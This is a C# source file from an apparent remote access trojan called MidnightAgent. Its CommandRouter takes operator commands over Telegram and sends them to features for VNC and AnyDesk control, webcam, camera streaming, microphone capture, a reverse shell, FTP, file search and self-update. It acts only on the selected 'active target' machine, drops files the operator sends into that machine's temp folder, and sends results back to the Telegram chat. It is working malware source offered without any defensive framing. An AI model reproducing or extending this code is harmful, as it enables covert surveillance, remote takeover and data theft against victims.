using System;
using System.Linq;
using System.Threading.Tasks;
using MidnightAgent.Core;
using MidnightAgent.Features;
using Newtonsoft.Json.Linq;

namespace MidnightAgent.Telegram
{
    /// <summary>
    /// Routes incoming commands to appropriate features
    /// </summary>
    public class CommandRouter
    {
        private readonly TelegramService _telegram;
        private readonly IFeature[] _features;

        public CommandRouter(TelegramService telegram)
        {
            _telegram = telegram;
            
            // Inject Telegram service into VNC feature for real-time progress updates
            VncFeature.TelegramInstance = telegram;
            AnyDeskFeature.TelegramInstance = telegram;
            FtpFeature.TelegramInstance = telegram;
            WebcamFeature.TelegramInstance = telegram;
            StreamCamFeature.TelegramInstance = telegram;
            RevShellFeature.TelegramInstance = telegram;
            UpdateFeature.TelegramInstance = telegram;
            SearchFeature.TelegramInstance = telegram;
            MicFeature.TelegramInstance = telegram;
            
            _features = FeatureRegistry.GetAllFeatures();
        }

        /// <summary>
        /// Handle incoming command from Telegram
        /// </summary>
        public void HandleCommand(string text, long chatId, JToken document = null)
        {
            try
            {
                if (string.IsNullOrEmpty(text))
                    return;

                string[] parts = text.Trim().Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length == 0)
                    return;

                string command = parts[0].ToLower();
                string[] args = parts.Skip(1).ToArray();

                // Remove leading slash
                if (command.StartsWith("/"))
                {
                    command = command.Substring(1);
                }
                else if (command.StartsWith("!")) // Ignore classic bangs if not matched earlier (or just treat as typo)
                {
                     // User requested removal of !update bang handling.
                     // We just ignore unknown bangs or treat as typo.
                     return;
                }

                Logger.Log($"Command received: {command}, Args: {string.Join(", ", args)}");

                var feature = _features.FirstOrDefault(f => 
                    f.Command.Equals(command, StringComparison.OrdinalIgnoreCase));

                if (feature != null)
                {
                    // Check target
                    // Allow 'job' (selection) and 'update' (self-targeted via ID) to bypass IsActiveTarget check
                    bool isGlobal = command.Equals("job", StringComparison.OrdinalIgnoreCase) || 
                                    command.Equals("update", StringComparison.OrdinalIgnoreCase);

                    if (!isGlobal && !AgentState.IsActiveTarget)
                    {
                        return;
                    }

                    ExecuteFeature(feature, args, chatId, document);
                }
                else
                {
                    _telegram.SendMessage($"❓ Unknown command: /{command}\nUse /help to see available commands.", chatId);
                }
            }
            catch (Exception ex)
            {
                _telegram.SendMessage($"❌ Error handling command: {ex.Message}", chatId);
            }
        }

        /// <summary>
        /// Handle file received
        /// </summary>
        public void HandleFileReceived(JToken document, long chatId)
        {
            // Standard File Download (Requires Active Target)
            if (!AgentState.IsActiveTarget) return;

            string fileId = document["file_id"]?.ToString();
            string fileName = document["file_name"]?.ToString();

            if (string.IsNullOrEmpty(fileId)) return;

            // Notify received
            _telegram.SendMessage($"📎 Received file: {fileName}\n(Saved to Temp)", chatId);
            
            Task.Run(() => 
            {
                try {
                    byte[] data = _telegram.DownloadFile(fileId);
                    string path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), fileName);
                    System.IO.File.WriteAllBytes(path, data);
                    _telegram.SendMessage($"💾 Saved to: {path}", chatId);
                } catch(Exception ex) {
                     System.Diagnostics.Debug.WriteLine($"Save file error: {ex}");
                }
            });
        }

        private void ExecuteFeature(IFeature feature, string[] args, long chatId, JToken document)
        {
            Task.Run(async () =>
            {
                try
                {
                    var featureResult = await feature.ExecuteAsync(args);

                    if (featureResult.Success)
                    {
                        if (!string.IsNullOrEmpty(featureResult.FilePath))
                        {
                            _telegram.SendDocument(featureResult.FilePath, featureResult.Message, chatId);
                            if (featureResult.DeleteFileAfterSend) try { System.IO.File.Delete(featureResult.FilePath); } catch { }
                        }
                        else if (featureResult.FileData != null)
                        {
                            _telegram.SendDocument(featureResult.FileData, 
                                featureResult.FileName ?? "file.bin", 
                                featureResult.Message, chatId);
                        }
                        else if (!string.IsNullOrEmpty(featureResult.Message))
                        {
                            if (featureResult.Message == "OPEN_MENU") _telegram.SendMainMenu(chatId);
                            else _telegram.SendMessage(featureResult.Message, chatId);
                        }
                    }
                    else
                    {
                        _telegram.SendMessage($"❌ {featureResult.Message}", chatId);
                    }
                }
                catch (Exception ex)
                {
                    _telegram.SendMessage($"❌ Error executing /{feature.Command}: {ex.Message}", chatId);
                }
            });
        }
    }
}
